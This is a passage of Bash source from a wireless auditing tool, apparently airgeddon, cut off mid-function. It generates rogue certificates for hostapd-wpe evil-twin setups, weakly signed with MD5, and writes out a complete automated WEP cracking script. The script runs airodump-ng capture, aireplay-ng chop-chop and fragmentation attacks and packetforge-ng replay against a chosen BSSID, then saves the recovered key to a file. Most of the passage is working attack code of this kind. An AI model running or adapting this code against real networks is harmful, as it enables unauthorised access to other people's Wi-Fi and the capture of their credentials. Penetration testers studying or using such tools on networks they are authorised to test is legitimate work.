	echo -e "commonName = \"${custom_certificates_cn}\""
	} >> "${tmpdir}${certsdir}server.cnf"

	{
	echo -e "[ ca ]"
	echo -e "default_ca = CA_default\n"
	echo -e "[ CA_default ]"
	echo -e "dir = ${tmpdir}${certsdir::-1}"
	echo -e 'certs = $dir'
	echo -e 'crl_dir = $dir/crl'
	echo -e 'database = $dir/index.txt'
	echo -e 'new_certs_dir = $dir'
	echo -e 'certificate = $dir/ca.pem'
	echo -e 'serial = $dir/serial'
	echo -e 'crl = $dir/crl.pem'
	echo -e 'private_key = $dir/ca.key'
	echo -e 'RANDFILE = $dir/.rand'
	echo -e "name_opt = ca_default"
	echo -e "cert_opt = ca_default"
	echo -e "default_days = 3650"
	echo -e "default_crl_days = 30"
	echo -e "default_md = md5"
	echo -e "preserve = no"
	echo -e "policy = policy_match\n"
	echo -e "[ policy_match ]"
	echo -e "countryName = match"
	echo -e "stateOrProvinceName = match"
	echo -e "organizationName= match"
	echo -e "organizationalUnitName = optional"
	echo -e "commonName = supplied"
	echo -e "emailAddress = optional\n"
	echo -e "[ policy_anything ]"
	echo -e "countryName = optional"
	echo -e "stateOrProvinceName = optional"
	echo -e "localityName = optional"
	echo -e "organizationName = optional"
	echo -e "organizationalUnitName = optional"
	echo -e "commonName = supplied"
	echo -e "emailAddress = optional\n"
	echo -e "[ req ]"
	echo -e "prompt = no"
	echo -e "distinguished_name = certificate_authority"
	echo -e "default_bits = 2048"
	echo -e "input_password = ${certspass}"
	echo -e "output_password = ${certspass}"
	echo -e "x509_extensions = v3_ca\n"
	echo -e "[certificate_authority]"
	echo -e "countryName = ${custom_certificates_country}"
	echo -e "stateOrProvinceName = ${custom_certificates_state}"
	echo -e "localityName = ${custom_certificates_locale}"
	echo -e "organizationName = ${custom_certificates_organization}"
	echo -e "emailAddress = ${custom_certificates_email}"
	echo -e "commonName = \"${custom_certificates_cn}\"\n"
	echo -e "[v3_ca]"
	echo -e "subjectKeyIdentifier = hash"
	echo -e "authorityKeyIdentifier = keyid:always,issuer:always"
	echo -e "basicConstraints = CA:true"
	} >> "${tmpdir}${certsdir}ca.cnf"

	{
	echo -e "[ xpclient_ext ]"
	echo -e "extendedKeyUsage = 1.3.6.1.5.5.7.3.2\n"
	echo -e "[ xpserver_ext ]"
	echo -e "extendedKeyUsage = 1.3.6.1.5.5.7.3.1"
	} >> "${tmpdir}${certsdir}xpextensions"
}

#Manage the questions to decide if custom certificates are used
#shellcheck disable=SC2181
function custom_certificates_integration() {

	debug_print

	ask_yesno 645 "no"
	if [ "${yesno}" = "y" ]; then
		if [ -n "${enterprisecerts_completepath}" ]; then
			ask_yesno 646 "yes"
			if [ "${yesno}" = "y" ]; then
				read_certspath=0
			else
				read_certspath=1
			fi
		else
			read_certspath=1
		fi
		use_custom_certs=1
	else
		use_custom_certs=0
	fi

	echo
	if [ "${use_custom_certs}" -eq 1 ]; then
		if [ "${read_certspath}" -eq 0 ]; then
			hostapd_wpe_cert_path="${enterprisecerts_completepath}"
			hostapd_wpe_cert_pass="${certspass}"
			language_strings "${language}" 648 "yellow"
		else
			language_strings "${language}" 327 "green"
			echo -en '> '
			hostapd_wpe_cert_path=$(read -re _hostapd_wpe_cert_path; echo -n "${_hostapd_wpe_cert_path}")
			hostapd_wpe_cert_path=$(fix_autocomplete_chars "${hostapd_wpe_cert_path}")

			lastcharhostapd_wpe_cert_path=${hostapd_wpe_cert_path: -1}
			if [ "${lastcharhostapd_wpe_cert_path}" != "/" ]; then
				hostapd_wpe_cert_path="${hostapd_wpe_cert_path}/"
			fi

			firstcharhostapd_wpe_cert_path=${hostapd_wpe_cert_path:: 1}
			if [ "${firstcharhostapd_wpe_cert_path}" != "/" ]; then
				hostapd_wpe_cert_path="${scriptfolder}${hostapd_wpe_cert_path}"
			fi

			hostapd_wpe_cert_pass=""
			while [[ ! ${hostapd_wpe_cert_pass} =~ ^.{4,1023}$ ]]; do
				echo
				language_strings "${language}" 329 "green"
				read -rp "> " hostapd_wpe_cert_pass
			done
		fi
	else
		hostapd_wpe_cert_path="${default_certs_path}"
		hostapd_wpe_cert_pass="${default_certs_pass}"
		language_strings "${language}" 647 "yellow"
	fi

	echo
	language_strings "${language}" 649 "blue"
	echo

	local certsresult
	certsresult=$(validate_certificates "${hostapd_wpe_cert_path}" "${hostapd_wpe_cert_pass}")
	if [ "${certsresult}" = "0" ]; then
		language_strings "${language}" 650 "yellow"
		language_strings "${language}" 115 "read"
		return 0
	elif [ "${certsresult}" = "1" ]; then
		language_strings "${language}" 237 "red"
		language_strings "${language}" 115 "read"
		return 1
	elif [ "${certsresult}" = "2" ]; then
		language_strings "${language}" 326 "red"
		language_strings "${language}" 115 "read"
		return 1
	else
		language_strings "${language}" 330 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi
}

#Validate if certificates files are correct
function validate_certificates() {

	debug_print
	local certsresult
	certsresult=0

	if ! [ -f "${1}server.pem" ] || ! [ -r "${1}server.pem" ] || ! [ -f "${1}ca.pem" ] || ! [ -r "${1}ca.pem" ] || ! [ -f "${1}server.key" ] || ! [ -r "${1}server.key" ]; then
		certsresult=1
	else
		if ! openssl x509 -in "${1}server.pem" -inform "PEM" -checkend "0" > /dev/null 2>&1 || ! openssl x509 -in "${1}ca.pem" -inform "PEM" -checkend "0" > /dev/null 2>&1; then
			certsresult=2
		elif ! openssl rsa -in "${1}server.key" -passin "pass:${2}" -check > /dev/null 2>&1; then
			certsresult=3
		fi
	fi

	echo "${certsresult}"
}

#Create custom certificates
function create_custom_certificates() {

	debug_print

	echo
	language_strings "${language}" 642 "blue"

	openssl dhparam -out "${tmpdir}${certsdir}dh" 1024 > /dev/null 2>&1
	openssl req -new -out "${tmpdir}${certsdir}server.csr" -keyout "${tmpdir}${certsdir}server.key" -config "${tmpdir}${certsdir}server.cnf" > /dev/null 2>&1
	openssl req -new -x509 -keyout "${tmpdir}${certsdir}ca.key" -out "${tmpdir}${certsdir}ca.pem" -days 3650 -config "${tmpdir}${certsdir}ca.cnf" > /dev/null 2>&1
	touch "${tmpdir}${certsdir}index.txt" > /dev/null 2>&1
	echo '01' > "${tmpdir}${certsdir}serial" 2> /dev/null
	openssl ca -batch -keyfile "${tmpdir}${certsdir}ca.key" -cert "${tmpdir}${certsdir}ca.pem" -in "${tmpdir}${certsdir}server.csr" -key "${certspass}" -out "${tmpdir}${certsdir}server.crt" -extensions xpserver_ext -extfile "${tmpdir}${certsdir}xpextensions" -config "${tmpdir}${certsdir}server.cnf" > /dev/null 2>&1
	openssl pkcs12 -export -in "${tmpdir}${certsdir}server.crt" -inkey "${tmpdir}${certsdir}server.key" -out "${tmpdir}${certsdir}server.p12" -passin pass:${certspass} -passout pass:${certspass} > /dev/null 2>&1
	openssl pkcs12 -in "${tmpdir}${certsdir}server.p12" -out "${tmpdir}${certsdir}server.pem" -passin pass:${certspass} -passout pass:${certspass} > /dev/null 2>&1

	manage_enterprise_certs
	save_enterprise_certs
}

#Set up custom certificates
function custom_certificates_questions() {

	debug_print

	custom_certificates_country=""
	custom_certificates_state=""
	custom_certificates_locale=""
	custom_certificates_organization=""
	custom_certificates_email=""
	custom_certificates_cn=""

	local email_length_regex
	local email_spetial_chars_regex
	local email_domain_regex
	local regexp

	regexp="^[A-Za-z]{2}$"
	while [[ ! ${custom_certificates_country} =~ ${regexp} ]]; do
		read_certificates_data "country"
	done

	while [[ -z "${custom_certificates_state}" ]]; do
		read_certificates_data "state"
	done

	while [[ -z "${custom_certificates_locale}" ]]; do
		read_certificates_data "locale"
	done

	while [[ -z "${custom_certificates_organization}" ]]; do
		read_certificates_data "organization"
	done

	email_length_regex='.*{7,320}'
	email_spetial_chars_regex='\!\#\$\%\&\*\+\/\=\?\^\_\`\{\|\}\~\-'
	email_domain_regex='([[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?)\.([[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?\.)*[[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?'
	regexp="^[[:alnum:]${email_spetial_chars_regex}]+(\.[[:alnum:]${email_spetial_chars_regex}]+)*[[:alnum:]${email_spetial_chars_regex}]*\@${email_domain_regex}$"
	while [[ ! ${custom_certificates_email} =~ ${regexp} ]] || [[ ! ${custom_certificates_email} =~ ${email_length_regex} ]]; do
		read_certificates_data "email"
	done

	regexp="^(\*|[[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?)\.([[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?\.)*[[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?$"
	while [[ ! ${custom_certificates_cn} =~ ${regexp} ]]; do
		read_certificates_data "cn"
	done
}

#Read the user input on custom certificates questions
function read_certificates_data() {

	debug_print

	echo
	case "${1}" in
		"country")
			language_strings "${language}" 630 "green"
			read -rp "> " custom_certificates_country
			custom_certificates_country="${custom_certificates_country^^}"
		;;
		"state")
			language_strings "${language}" 631 "green"
			read -rp "> " custom_certificates_state
		;;
		"locale")
			language_strings "${language}" 632 "green"
			read -rp "> " custom_certificates_locale
		;;
		"organization")
			language_strings "${language}" 633 "green"
			read -rp "> " custom_certificates_organization
		;;
		"email")
			language_strings "${language}" 634 "green"
			read -rp "> " custom_certificates_email
			custom_certificates_email="${custom_certificates_email,,}"
		;;
		"cn")
			language_strings "${language}" 635 "green"
			read -rp "> " custom_certificates_cn
			custom_certificates_cn="${custom_certificates_cn,,}"
		;;
	esac
}

#Validate if selected network has the needed type of encryption
function validate_network_encryption_type() {

	debug_print

	case ${1} in
		"WPA"|"WPA2")
			if [[ "${enc}" != "WPA" ]] && [[ "${enc}" != "WPA2" ]]; then
				echo
				language_strings "${language}" 137 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		;;
		"WEP")
			if [ "${enc}" != "WEP" ]; then
				echo
				language_strings "${language}" 424 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		;;
	esac

	return 0
}

#Execute wep all-in-one attack
#shellcheck disable=SC2164
function exec_wep_allinone_attack() {

	debug_print

	echo
	language_strings "${language}" 296 "yellow"
	language_strings "${language}" 115 "read"

	prepare_wep_attack
	set_wep_script

	recalculate_windows_sizes
	bash "${tmpdir}${wep_attack_file}" > /dev/null 2>&1 &
	wep_script_pid=$!

	set_wep_key_script
	bash "${tmpdir}${wep_key_handler}" "${wep_script_pid}" > /dev/null 2>&1 &
	wep_key_script_pid=$!

	echo
	language_strings "${language}" 434 "yellow"
	language_strings "${language}" 115 "read"

	kill_wep_windows
}

#Kill the wep attack processes
function kill_wep_windows() {

	debug_print

	kill "${wep_script_pid}" &> /dev/null
	wait $! 2> /dev/null

	kill "${wep_key_script_pid}" &> /dev/null
	wait $! 2> /dev/null

	readarray -t WEP_PROCESSES_TO_KILL < <(cat < "${tmpdir}${wepdir}${wep_processes_file}" 2> /dev/null)
	for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
		kill "${item}" &> /dev/null
	done
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		kill_tmux_windows
	fi
}

#Prepare wep attack deleting temp files
function prepare_wep_attack() {

	debug_print

	tmpfiles_toclean=1

	rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
	rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
}

#Create here-doc bash script used for key handling on wep all-in-one attack
function set_wep_key_script() {

	debug_print

	exec 8>"${tmpdir}${wep_key_handler}"

	cat >&8 <<-EOF
		#!/usr/bin/env bash
		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"
	EOF

	cat >&8 <<-EOF

		function manage_output() {

			xterm_parameters="\${1}"
			tmux_command_line="\${2}"
			xterm_command_line="\"\${2}\""
			window_name="\${3}"
			command_tail=" > /dev/null 2>&1 &"

			case "\${AIRGEDDON_WINDOWS_HANDLING}" in
				"tmux")
					local tmux_color
					tmux_color=""
					[[ "\${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="\${BASH_REMATCH[2]}"
					case "\${4}" in
						"active")
							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}" "active"
						;;
						*)
							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}"
						;;
					esac
				;;
				"xterm")
					eval "xterm \${xterm_parameters} -e \${xterm_command_line}\${command_tail}"
				;;
			esac
		}
		function start_tmux_processes() {

			window_name="\${1}"
			command_line="\${2}"
			tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
			case "\${4}" in
				"active")
					tmux new-window -t "${session_name}:" -n "\${window_name}"
				;;
				*)
					tmux new-window -d -t "${session_name}:" -n "\${window_name}"
				;;
			esac
			local tmux_color_cmd
			if [ -n "\${3}" ]; then
				tmux_color_cmd="bg=#000000 fg=\${3}"
			else
				tmux_color_cmd="bg=#000000"
			fi
			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
		}
	EOF

	cat >&8 <<-EOF
		wep_key_found=0

		#Check if the wep password was captured and manage to save it on a file
		function manage_wep_pot() {

			if [ -f "${tmpdir}${wepdir}wepkey.txt" ]; then
				wep_hex_key_cmd="cat \"${tmpdir}${wepdir}wepkey.txt\""
	EOF

	cat >&8 <<-'EOF'
				wep_hex_key=$(eval "${wep_hex_key_cmd}")
				wep_ascii_key=$(echo "${wep_hex_key}" | awk 'RT{printf "%c", strtonum("0x"RT)}' RS='[0-9A-Fa-f]{2}')
	EOF

	cat >&8 <<-EOF
				echo "" > "${weppotenteredpath}"
				{
	EOF

	cat >&8 <<-'EOF'
				date +%Y-%m-%d
	EOF

	cat >&8 <<-EOF
				echo -e "${wep_texts[${language},1]}"
				echo ""
				echo -e "BSSID: ${bssid}"
				echo -e "${wep_texts[${language},2]}: ${channel}"
				echo -e "ESSID: ${essid}"
				echo ""
				echo "---------------"
				echo ""
	EOF

	cat >&8 <<-'EOF'
				echo -e "ASCII: ${wep_ascii_key}"
	EOF

	cat >&8 <<-EOF
				echo -en "${wep_texts[${language},3]}:"
	EOF

	cat >&8 <<-'EOF'
				echo -en " ${wep_hex_key}"
				echo ""
	EOF

	cat >&8 <<-EOF
				} >> "${weppotenteredpath}"

				{
				echo ""
				echo "---------------"
				echo ""
				echo "${footer_texts[${language},0]}"
				} >> "${weppotenteredpath}"
			fi
		}

		#Kill the wep attack processes
		function kill_wep_script_windows() {

			readarray -t WEP_PROCESSES_TO_KILL < <(cat < "${tmpdir}${wepdir}${wep_processes_file}" 2> /dev/null)
	EOF

	cat >&8 <<-'EOF'
			for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
				kill "${item}" &> /dev/null
			done
		}
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&8 <<-EOF
			function kill_tmux_windows() {

				local TMUX_WINDOWS_LIST=()
				local current_window_name
				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
						continue
					fi
					if [ -n "\${1}" ]; then
						if [ "\${current_window_name}" = "\${1}" ]; then
							continue
						fi
					fi
					tmux kill-window -t "${session_name}:\${current_window_name}"
				done
			}
		EOF
	fi

	cat >&8 <<-EOF
		while true; do
			sleep 1
			if [ -f "${tmpdir}${wepdir}wepkey.txt" ]; then
				wep_key_found=1
				break
			fi
	EOF

	cat >&8 <<-'EOF'
			wep_script_alive=$(ps uax | awk '{print $2}' | grep -E "^${1}$" 2> /dev/null)
			if [ -z "${wep_script_alive}" ]; then
				break
			fi
		done

		if [ "${wep_key_found}" -eq 1 ]; then
			manage_wep_pot
		fi
	EOF

	cat >&8 <<-EOF
		kill_wep_script_windows
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&8 <<-EOF
			kill_tmux_windows "WEP Key Decrypted"
		EOF
	fi

	cat >&8 <<-EOF
		rm -rf "${tmpdir}${wepdir}${wep_processes_file}"
		touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
	EOF

	cat >&8 <<-'EOF'
		if [ "${wep_key_found}" -eq 1 ]; then
	EOF

	cat >&8 <<-EOF
			wep_key_cmd="echo -e '\t${yellow_color}${wep_texts[${language},5]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${wep_texts[${language},2]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}'"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -e '\t${blue_color}${wep_texts[${language},4]}${normal_color}'"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -en '\t${blue_color}ASCII: ${normal_color}'"
	EOF

	cat >&8 <<-'EOF'
			wep_key_cmd+="&& echo -en '${wep_ascii_key}'"
	EOF

	cat >&8 <<-EOF
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -en '\t${blue_color}${wep_texts[${language},3]}: ${normal_color}'"
	EOF

	cat >&8 <<-'EOF'
			wep_key_cmd+="&& echo -en '${wep_hex_key}'"
	EOF

	cat >&8 <<-EOF
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -e '\t${pink_color}${wep_texts[${language},6]}: [${normal_color}${weppotenteredpath}${pink_color}]${normal_color}'"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -e '\t${yellow_color}${wep_texts[${language},0]}'"

			window_position="${g5_topright_window}"
			sleep 0.5
			manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry \${window_position} -T \"WEP Key Decrypted\"" "clear;\${wep_key_cmd}" "WEP Key Decrypted" "active"
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		cat >&8 <<-EOF
			wep_key_window_pid=\$!
			{
				echo -e "\${wep_key_window_pid}"
			} >> "${tmpdir}${wepdir}${wep_processes_file}"
		EOF
	fi

	cat >&8 <<-EOF
		fi
	EOF
}

#Create here-doc bash script used for wep all-in-one attack
function set_wep_script() {

	debug_print

	current_mac=$(cat < "/sys/class/net/${interface}/address" 2> /dev/null)

	exec 6>"${tmpdir}${wep_attack_file}"

	cat >&6 <<-EOF
		#!/usr/bin/env bash
		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"
		global_process_pid=""

		function manage_output() {

			xterm_parameters="\${1}"
			tmux_command_line="\${2}"
			xterm_command_line="\"\${2}\""
			window_name="\${3}"
			command_tail=" > /dev/null 2>&1 &"

			case "\${AIRGEDDON_WINDOWS_HANDLING}" in
				"tmux")
					local tmux_color
					tmux_color=""
					[[ "\${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="\${BASH_REMATCH[2]}"
					case "\${4}" in
						"active")
							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}" "active"
						;;
						*)
							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}"
						;;
					esac
				;;
				"xterm")
					eval "xterm \${xterm_parameters} -e \${xterm_command_line}\${command_tail}"
				;;
			esac
		}
		function start_tmux_processes() {

			window_name="\${1}"
			command_line="\${2}"
			tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
			case "\${4}" in
				"active")
					tmux new-window -t "${session_name}:" -n "\${window_name}"
				;;
				*)
					tmux new-window -d -t "${session_name}:" -n "\${window_name}"
				;;
			esac
			local tmux_color_cmd
			if [ -n "\${3}" ]; then
				tmux_color_cmd="bg=#000000 fg=\${3}"
			else
				tmux_color_cmd="bg=#000000"
			fi
			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
		}
		function get_tmux_process_id() {

			local process_pid
			local process_cmd_line
			process_cmd_line=\$(echo "\${1}" | tr -d '"')
			while [ -z "\${process_pid}" ]; do
				process_pid=\$(ps --no-headers aux | grep "\${process_cmd_line}" | grep -v "grep \${process_cmd_line}" | awk '{print \$2}')
			done
			global_process_pid="\${process_pid}"
		}
		function kill_tmux_window_by_name() {
			if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				tmux kill-window -t "${session_name}:\${1}" 2> /dev/null
			fi
		}

		#shellcheck disable=SC1037
		#shellcheck disable=SC2164
		#shellcheck disable=SC2140
		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
		mkdir "${tmpdir}${wepdir}" > /dev/null 2>&1
		cd "${tmpdir}${wepdir}" > /dev/null 2>&1
	EOF

	cat >&6 <<-'EOF'
		#Execute wep chop-chop attack on its different phases
		function wep_chopchop_attack() {

			case ${wep_chopchop_phase} in
				1)
	EOF

	cat >&6 <<-EOF
					if grep "Now you can build a packet" "${tmpdir}${wepdir}chopchop_output.txt" > /dev/null 2>&1; then
	EOF

	cat >&6 <<-'EOF'
						wep_chopchop_phase=2
					else
						wep_chopchop_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase1_pid}$" 2> /dev/null)
						if [[ ${wep_chopchop_launched} -eq 0 ]] || [ -z "${wep_chopchop_phase1_pid_alive}" ]; then
							wep_chopchop_launched=1
	EOF

	cat >&6 <<-EOF
							manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (1/3)\"" "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" "Chop-Chop Attack (1/3)"
							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
								get_tmux_process_id "aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface}"
								wep_chopchop_phase1_pid="\${global_process_pid}"
								global_process_pid=""
							else
								wep_chopchop_phase1_pid=\$!
							fi
	EOF

	cat >&6 <<-'EOF'
							wep_script_processes+=(${wep_chopchop_phase1_pid})
						fi
					fi
				;;
				2)
	EOF

	cat >&6 <<-EOF
					kill_tmux_window_by_name "Chop-Chop Attack (1/3)"
					manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" "Chop-Chop Attack (2/3)"
					if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
						wep_chopchop_phase2_pid=\$!
					fi
	EOF

	cat >&6 <<-'EOF'
						wep_script_processes+=(${wep_chopchop_phase2_pid})
						wep_chopchop_phase=3
					;;
					3)
						wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase2_pid}$" 2> /dev/null)
	EOF

	cat >&6 <<-EOF
						if [[ -z "\${wep_chopchop_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}chopchop.cap" ]]; then
							kill_tmux_window_by_name "Chop-Chop Attack (2/3)"
							manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
								get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
								wep_script_processes+=("\${global_process_pid}")
								global_process_pid=""
							else
								wep_script_processes+=(\$!)
							fi
	EOF

	cat >&6 <<-'EOF'
							wep_chopchop_phase=4
						fi
					;;
			esac
			write_wep_processes
		}
	EOF

	cat >&6 <<-EOF
		#Execute wep fragmentation attack on its different phases
		function wep_fragmentation_attack() {
	EOF

	cat >&6 <<-'EOF'
			case ${wep_fragmentation_phase} in
				1)
	EOF

	cat >&6 <<-EOF
					if grep "Now you can build a packet" "${tmpdir}${wepdir}fragmentation_output.txt" > /dev/null 2>&1; then
	EOF

	cat >&6 <<-'EOF'
						wep_fragmentation_phase=2
					else
						wep_fragmentation_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fragmentation_phase1_pid}$" 2> /dev/null)
						if [[ ${wep_fragmentation_launched} -eq 0 ]] || [ -z "${wep_fragmentation_phase1_pid_alive}" ]; then
							wep_fragmentation_launched=1
	EOF

	cat >&6 <<-EOF
							manage_output "-bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (1/3)\"" "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" "Fragmentation Attack (1/3)"
							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
								get_tmux_process_id "aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface}"
								wep_fragmentation_phase1_pid="\${global_process_pid}"
								global_process_pid=""
							else
								wep_fragmentation_phase1_pid=\$!
							fi
	EOF

	cat >&6 <<-'EOF'
							wep_script_processes+=(${wep_fragmentation_phase1_pid})
						fi
					fi
				;;
				2)
	EOF

	cat >&6 <<-EOF
						kill_tmux_window_by_name "Fragmentation Attack (1/3)"
						manage_output "-bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" "Fragmentation Attack (2/3)"
						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
							wep_fragmentation_phase2_pid=\$!
						fi
	EOF

	cat >&6 <<-'EOF'
					wep_fragmentation_phase=3
					wep_script_processes+=(${wep_fragmentation_phase2_pid})
				;;
				3)
					wep_fragmentation_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fragmentation_phase2_pid}$" 2> /dev/null)
	EOF

	cat >&6 <<-EOF
					if [[ -z "\${wep_fragmentation_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}fragmentation.cap" ]]; then
						kill_tmux_window_by_name "Fragmentation Attack (2/3)"
						manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" "Fragmentation Attack (3/3)"
						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}"
							wep_script_processes+=("\${global_process_pid}")
							global_process_pid=""
						else
							wep_script_processes+=(\$!)
						fi
	EOF

	cat >&6 <<-'EOF'
							wep_fragmentation_phase=4
					fi
				;;
			esac
			write_wep_processes
		}

		#Write on a file the id of the WEP attack processes
		function write_wep_processes() {
	EOF

	cat >&6 <<-EOF
			if [ ! -f "${tmpdir}${wepdir}${wep_processes_file}" ]; then
				touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
			fi
			path_to_process_file="${tmpdir}${wepdir}${wep_processes_file}"
	EOF

	cat >&6 <<-'EOF'
			for item in "${wep_script_processes[@]}"; do
				grep -E "^${item}$" "${path_to_process_file}" > /dev/null 2>&1
	EOF

	cat >&6 <<-'EOF'
				if [ "$?" != "0" ]; then
					echo "${item}" >>\
	EOF

	cat >&6 <<-EOF
					"${tmpdir}${wepdir}${wep_processes_file}"
				fi
			done
		}

		wep_script_processes=()

		manage_output "-bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g5_topright_window} -T \"Capturing WEP Data\"" "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" "Capturing WEP Data" "active"
		if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
			get_tmux_process_id "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}"
			wep_script_capture_pid="\${global_process_pid}"
			global_process_pid=""
		else
			wep_script_capture_pid=\$!
		fi
	EOF

	cat >&6 <<-'EOF'
		wep_script_processes+=(${wep_script_capture_pid})
		write_wep_processes
	EOF

	cat >&6 <<-EOF
		wep_to_be_launched_only_once=0
		wep_fakeauth_pid=""
		wep_aircrack_launched=0
		current_ivs=0
		wep_chopchop_launched=0
		wep_chopchop_phase=1
		wep_fragmentation_launched=0
		wep_fragmentation_phase=1
	EOF

	cat >&6 <<-'EOF'
		while true; do
			wep_capture_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_script_capture_pid}$" 2> /dev/null)
			wep_fakeauth_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fakeauth_pid}$" 2> /dev/null)

			if [[ -n ${wep_capture_pid_alive} ]] && [[ -z ${wep_fakeauth_pid_alive} ]]; then
	EOF

	cat >&6 <<-EOF
